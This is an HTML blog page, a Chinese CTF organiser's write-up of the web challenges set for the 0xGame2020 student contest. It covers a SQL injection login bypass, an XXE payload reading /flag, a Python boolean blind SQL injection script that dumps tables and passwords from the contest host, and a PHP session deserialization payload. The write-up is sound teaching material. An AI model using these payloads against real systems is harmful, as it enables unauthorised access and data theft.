@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='学校有史以来第一次这么简单的新生赛，我承担平台的运维和web出题。
+第一次出这么多题，虽然题目难度都不大，不过折腾和搞平台环境还是花了不少精力，目的在于三点：
+ 希望CTF能在学校更普及 希望能找到有兴趣和有毅力的学弟学妹 题目很多都是来自入门文档的知识点，看过的一定很容易做出来，希望新同学能认真看资料   题目开源地址：https://github.com/Anthem-whisper/0xGame2020
+所有题目环境：https://shimo.im/docs/8hkRHdRDdWyKycyK
+因为是自费运营，还请师傅们不要恶意破坏环境
+第一周 题目都是最简单的入门题目，也不涉及web漏洞，没什么好说的。主要考察同学们配置环境的动手能力。
+第二周 出了一道很简单的SQL注入，
+核心是要猜测登录时所拼接的sql语句：
+$sql = &amp;quot;select username from user where username=&#39;&amp;quot;. $username .&amp;quot;&#39; and password=&#39;&amp;quot;. $password .&amp;quot;&#39;;&amp;quot;;没有任何waf，在用户名处输入admin&#39; or 1=1#搞定，由于#符号把后面的语句注视掉了，实际上sql语句实际上变成了：
+select username from user where username=&#39;admin&#39; or 1=11=1是永远成立的，所以必然能返回大于一行的数据，也就是 mysql_num_rows($res)&amp;gt;0，就可以获得flag
+第三周 一道XXE，一道SQL布尔盲注
+inject_me XXE是去年NCTF2019的原题，我在web入门doc里面写过，并且题目地址和源码我都给了。
+在给了hint的情况下这么少的解还是出乎我的意料
+由HTTP响应里面返回的标签以及Content-Type是xml格式可以很轻易的百度到XXE这种攻击手段
+XXE学习：https://xz.aliyun.com/t/3357
+告诉了/flag，那么随手一个payload就出来了：
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE dy [&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;]&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;close_eyes 布尔盲注很多同学用手打，本来目的是想叫你们去学python的，结果硬是手打出来了，下次出个128位的flag（bushi
+本来想稍微加点waf的，后来不想出难了就没加，开SQLmap的莫得灵魂。
+布尔盲注学习：https://xz.aliyun.com/t/7169#toc-2
+这篇文章不仅仅讲了盲注也讲了其他的一些手法，值得钻研一番
+思路就是语句为假的时候（比如我用户名输入1&#39;||1=0#或者乱输一个用户名密码），页面回显“数据库里没你这号人,别想骗劳资.jpg”
+为真的时候（比如我输入1&#39;||1=1#）页面回显“数据库有你这号人，那又怎么着？”，根据回显情况的不同，我们就可以判断我们的condition究竟是真还是假。
+1&#39;||(condition)#不断地改变condition就可以查到我们想要的数据；'><title>0xGame2020出题笔记</title>
+
+<link rel='canonical' href='https://anthem-whisper.github.io/tmp/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='0xGame2020出题笔记'>
+<meta property='og:description' content='学校有史以来第一次这么简单的新生赛，我承担平台的运维和web出题。
+第一次出这么多题，虽然题目难度都不大，不过折腾和搞平台环境还是花了不少精力，目的在于三点：
+ 希望CTF能在学校更普及 希望能找到有兴趣和有毅力的学弟学妹 题目很多都是来自入门文档的知识点，看过的一定很容易做出来，希望新同学能认真看资料   题目开源地址：https://github.com/Anthem-whisper/0xGame2020
+所有题目环境：https://shimo.im/docs/8hkRHdRDdWyKycyK
+因为是自费运营，还请师傅们不要恶意破坏环境
+第一周 题目都是最简单的入门题目，也不涉及web漏洞，没什么好说的。主要考察同学们配置环境的动手能力。
+第二周 出了一道很简单的SQL注入，
+核心是要猜测登录时所拼接的sql语句：
+$sql = &amp;quot;select username from user where username=&#39;&amp;quot;. $username .&amp;quot;&#39; and password=&#39;&amp;quot;. $password .&amp;quot;&#39;;&amp;quot;;没有任何waf，在用户名处输入admin&#39; or 1=1#搞定，由于#符号把后面的语句注视掉了，实际上sql语句实际上变成了：
+select username from user where username=&#39;admin&#39; or 1=11=1是永远成立的，所以必然能返回大于一行的数据，也就是 mysql_num_rows($res)&amp;gt;0，就可以获得flag
+第三周 一道XXE，一道SQL布尔盲注
+inject_me XXE是去年NCTF2019的原题，我在web入门doc里面写过，并且题目地址和源码我都给了。
+在给了hint的情况下这么少的解还是出乎我的意料
+由HTTP响应里面返回的标签以及Content-Type是xml格式可以很轻易的百度到XXE这种攻击手段
+XXE学习：https://xz.aliyun.com/t/3357
+告诉了/flag，那么随手一个payload就出来了：
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE dy [&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;]&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;close_eyes 布尔盲注很多同学用手打，本来目的是想叫你们去学python的，结果硬是手打出来了，下次出个128位的flag（bushi
+本来想稍微加点waf的，后来不想出难了就没加，开SQLmap的莫得灵魂。
+布尔盲注学习：https://xz.aliyun.com/t/7169#toc-2
+这篇文章不仅仅讲了盲注也讲了其他的一些手法，值得钻研一番
+思路就是语句为假的时候（比如我用户名输入1&#39;||1=0#或者乱输一个用户名密码），页面回显“数据库里没你这号人,别想骗劳资.jpg”
+为真的时候（比如我输入1&#39;||1=1#）页面回显“数据库有你这号人，那又怎么着？”，根据回显情况的不同，我们就可以判断我们的condition究竟是真还是假。
+1&#39;||(condition)#不断地改变condition就可以查到我们想要的数据；'>
+<meta property='og:url' content='https://anthem-whisper.github.io/tmp/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Tmp' />
+<meta name="twitter:title" content="0xGame2020出题笔记">
+<meta name="twitter:description" content="学校有史以来第一次这么简单的新生赛，我承担平台的运维和web出题。
+第一次出这么多题，虽然题目难度都不大，不过折腾和搞平台环境还是花了不少精力，目的在于三点：
+ 希望CTF能在学校更普及 希望能找到有兴趣和有毅力的学弟学妹 题目很多都是来自入门文档的知识点，看过的一定很容易做出来，希望新同学能认真看资料   题目开源地址：https://github.com/Anthem-whisper/0xGame2020
+所有题目环境：https://shimo.im/docs/8hkRHdRDdWyKycyK
+因为是自费运营，还请师傅们不要恶意破坏环境
+第一周 题目都是最简单的入门题目，也不涉及web漏洞，没什么好说的。主要考察同学们配置环境的动手能力。
+第二周 出了一道很简单的SQL注入，
+核心是要猜测登录时所拼接的sql语句：
+$sql = &amp;quot;select username from user where username=&#39;&amp;quot;. $username .&amp;quot;&#39; and password=&#39;&amp;quot;. $password .&amp;quot;&#39;;&amp;quot;;没有任何waf，在用户名处输入admin&#39; or 1=1#搞定，由于#符号把后面的语句注视掉了，实际上sql语句实际上变成了：
+select username from user where username=&#39;admin&#39; or 1=11=1是永远成立的，所以必然能返回大于一行的数据，也就是 mysql_num_rows($res)&amp;gt;0，就可以获得flag
+第三周 一道XXE，一道SQL布尔盲注
+inject_me XXE是去年NCTF2019的原题，我在web入门doc里面写过，并且题目地址和源码我都给了。
+在给了hint的情况下这么少的解还是出乎我的意料
+由HTTP响应里面返回的标签以及Content-Type是xml格式可以很轻易的百度到XXE这种攻击手段
+XXE学习：https://xz.aliyun.com/t/3357
+告诉了/flag，那么随手一个payload就出来了：
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE dy [&amp;lt;!ENTITY dy SYSTEM &amp;quot;file:///flag&amp;quot;&amp;gt;]&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;dy;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;close_eyes 布尔盲注很多同学用手打，本来目的是想叫你们去学python的，结果硬是手打出来了，下次出个128位的flag（bushi
+本来想稍微加点waf的，后来不想出难了就没加，开SQLmap的莫得灵魂。
+布尔盲注学习：https://xz.aliyun.com/t/7169#toc-2
+这篇文章不仅仅讲了盲注也讲了其他的一些手法，值得钻研一番
+思路就是语句为假的时候（比如我用户名输入1&#39;||1=0#或者乱输一个用户名密码），页面回显“数据库里没你这号人,别想骗劳资.jpg”
+为真的时候（比如我输入1&#39;||1=1#）页面回显“数据库有你这号人，那又怎么着？”，根据回显情况的不同，我们就可以判断我们的condition究竟是真还是假。
+1&#39;||(condition)#不断地改变condition就可以查到我们想要的数据；">
+    </head>
+    <body class="article-page keep-sidebar">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended ">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全和代码审计</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/tmp/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">0xGame2020出题笔记</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181429.png" alt=""  /></p>
+<p>学校有史以来第一次这么简单的新生赛，我承担平台的运维和web出题。</p>
+<p>第一次出这么多题，虽然题目难度都不大，不过折腾和搞平台环境还是花了不少精力，目的在于三点：</p>
+<ol>
+<li>希望CTF能在学校更普及</li>
+<li>希望能找到有兴趣和有毅力的学弟学妹</li>
+<li>题目很多都是来自入门文档的知识点，看过的一定很容易做出来，希望新同学能认真看资料</li>
+</ol>
+<hr>
+<p>题目开源地址：https://github.com/Anthem-whisper/0xGame2020</p>
+<p>所有题目环境：https://shimo.im/docs/8hkRHdRDdWyKycyK</p>
+<p>因为是自费运营，还请师傅们不要恶意破坏环境</p>
+<h3 id="第一周">第一周</h3>
+<p>题目都是最简单的入门题目，也不涉及web漏洞，没什么好说的。主要考察同学们配置环境的动手能力。</p>
+<h3 id="第二周">第二周</h3>
+<p>出了一道很简单的SQL注入，</p>
+<p>核心是要猜测登录时所拼接的sql语句：</p>
+<pre><code>$sql = &quot;select username from user where username='&quot;. $username .&quot;' and password='&quot;. $password .&quot;';&quot;;
+</code></pre><p>没有任何waf，在用户名处输入<code>admin' or 1=1#</code>搞定，由于#符号把后面的语句注视掉了，实际上sql语句实际上变成了：</p>
+<pre><code>select username from user where username='admin' or 1=1
+</code></pre><p>1=1是永远成立的，所以必然能返回大于一行的数据，也就是 mysql_num_rows($res)&gt;0，就可以获得flag</p>
+<h3 id="第三周">第三周</h3>
+<p>一道XXE，一道SQL布尔盲注</p>
+<h4 id="inject_me">inject_me</h4>
+<p>XXE是去年NCTF2019的原题，我在web入门doc里面写过，并且题目地址和源码我都给了。</p>
+<p>在给了hint的情况下这么少的解还是出乎我的意料</p>
+<p>由HTTP响应里面返回的标签以及Content-Type是xml格式可以很轻易的百度到XXE这种攻击手段</p>
+<p>XXE学习：https://xz.aliyun.com/t/3357</p>
+<p>告诉了/flag，那么随手一个payload就出来了：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE dy [
+&lt;!ENTITY dy SYSTEM &quot;file:///flag&quot;&gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;&amp;dy;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
+</code></pre><h4 id="close_eyes">close_eyes</h4>
+<p>布尔盲注很多同学用手打，本来目的是想叫你们去学python的，结果硬是手打出来了，下次出个128位的flag（bushi</p>
+<p>本来想稍微加点waf的，后来不想出难了就没加，开SQLmap的莫得灵魂。</p>
+<p>布尔盲注学习：https://xz.aliyun.com/t/7169#toc-2</p>
+<p>这篇文章不仅仅讲了盲注也讲了其他的一些手法，值得钻研一番</p>
+<p>思路就是语句为假的时候（比如我用户名输入1'||1=0#或者乱输一个用户名密码），页面回显“数据库里没你这号人,别想骗劳资.jpg”</p>
+<p>为真的时候（比如我输入1'||1=1#）页面回显“数据库有你这号人，那又怎么着？”，根据回显情况的不同，我们就可以判断我们的condition究竟是真还是假。</p>
+<pre><code>1'||(condition)#
+</code></pre><p>不断地改变condition就可以查到我们想要的数据；</p>
+<p>举个例子：</p>
+<pre><code>1'||length(database())&gt;1#
+</code></pre><p>判断数据库名字的长度是不是大于1，页面返回“数据库有你这号人，那又怎么着？”，那么我们就可以确定数据库名字长度大于1。</p>
+<p>类似的：</p>
+<pre><code>1'||ascii(substr(database(),1,1))=117#
+</code></pre><p>可判断数据库第一个字母是ASCII码为117的字母，也就是‘u'。</p>
+<p>也可以使用二分法进行盲注。</p>
+<p>exp：</p>
+<pre><code>#python3
+#wh1sper
+import requests
+host = 'http://59.110.157.4:30052/login.php'
+def mid(bot, top):
+    return (int)(0.5 * (top + bot))
+def sqli():
+    name = ''
+    for j in range(1, 250):
+        top = 126
+        bot = 32
+        while 1:
+            babyselect = 'database()'#user
+            #babyselect = '(select table_name from information_schema.tables where table_schema=database())'#user
+            #babyselect = &quot;(select group_concat(column_name) from information_schema.columns &quot; \
+            #            &quot;where table_schema=database() and table_name='user')&quot;#id,username,password
+            #babyselect = &quot;(select group_concat(password) from user)&quot;#0xGame{blind_sqli_1s_not_hard}
+            data = {
+                &quot;password&quot;: &quot;1&quot;,
+                &quot;username&quot;: &quot;1'||ascii(substr({},{},1))&gt;{}#&quot;.format(babyselect, j, mid(bot, top))
+            }
+            r = requests.post(url=host, data=data)
+            #print(r.text)
+            print(data)
+            if '数据库有你这号人' in r.text:#子查询为真
+                if top - 1 == bot:
+                    name += chr(top)
+                    print(name)
+                    break
+                bot = mid(bot, top)
+            else:
+                if top - 1 == bot:
+                    name += chr(bot)
+                    print(name)
+                    break
+                top = mid(bot, top)
+if __name__ == '__main__':
+    sqli()
+</code></pre><h3 id="第四周">第四周</h3>
+<h4 id="broken_motto">broken_motto</h4>
+<p>session反序列化，也是文档里面出现过的</p>
+<p>&gt;&gt;<a class="link" href="https://www.mi1k7ea.com/2019/04/21/PHP-session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e/"  target="_blank" rel="noopener"
+    >学习链接</a>，建议自己本地动手搭一个环境</p>
+<p>在profile.php里面里面有一行注释：</p>
+<pre><code>//ini_set('session.serialize_handler','php_serialize');
+</code></pre><p>这行代码使用的Session序列化选择器是php_serialize，注释之后默认使用的是php</p>
+<p>两种选择器的不同的处理方式导致了session反序列化的漏洞的产生，存session的时候，存入php_serialize经过serialize()函数序列处理的数组</p>
+<p>读取的时候php以键名 ＋ 竖线 ＋ 经过 serialize() 函数序列化的数据处理如果你注册的时候加一个|，他会把<code>|</code>前面的忽略掉，只反序列化后面的，就可以造成对象注入。</p>
+<p>exp：</p>
+<pre><code>&lt;?php
+ 
+class info{
+    public $admin;
+    public $username;
+    public $motto;
+ 
+}
+ 
+$pop = new info();
+$pop-&gt;admin = 1;
+echo serialize($pop);
+</code></pre><p>payload：</p>
+<pre><code>|O:4:&quot;info&quot;:3:{s:5:&quot;admin&quot;;i:1;s:8:&quot;username&quot;;N;s:5:&quot;motto&quot;;N;}
+</code></pre><p>这次比赛总的来说呢，还是很成功的，相信同学们都找到了自己心里一直想追求的方向，当然，比赛中也不乏表现突出的选手，希望你们能坚持下去，去追求更深的技术，更好的未来</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+     
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2019 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
